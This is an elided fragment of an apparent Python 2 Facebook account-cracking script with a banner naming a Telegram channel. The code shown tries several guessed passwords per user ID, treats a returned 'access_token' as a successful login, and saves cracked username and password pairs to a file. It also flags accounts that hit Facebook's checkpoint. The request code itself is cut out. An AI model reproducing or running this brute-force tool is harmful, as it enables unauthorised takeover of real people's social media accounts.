...
\033[1;91m Telegram CH   : wardak
\033[1;91m TLEGRAM GP    : هکرانو مشر
\033[1;97m--------------------------------------------------
"""
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print ' \x1b[1;93m[wardak_OK] ' + k + c + user + ' | ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print ' \x1b[1;93m[MKING_OK] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[wardaj_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Mking.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[wardak_OK] ' + k + c + user + ' | ' + pass3
                        cps = open('Mking.txt', 'a')
                        ...
                        if 'access_token' in q:
                            ...
                            print ' \x1b[1;93m[wardak_Ok] ' + k + c + user + ' | ' + pass4
                            cps = open('Mking.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                print ' \x1b[1;93m[wardak_OK] ' + k + c + user + ' | ' + pass5
                                cps = open('Mking.txt', 'a')
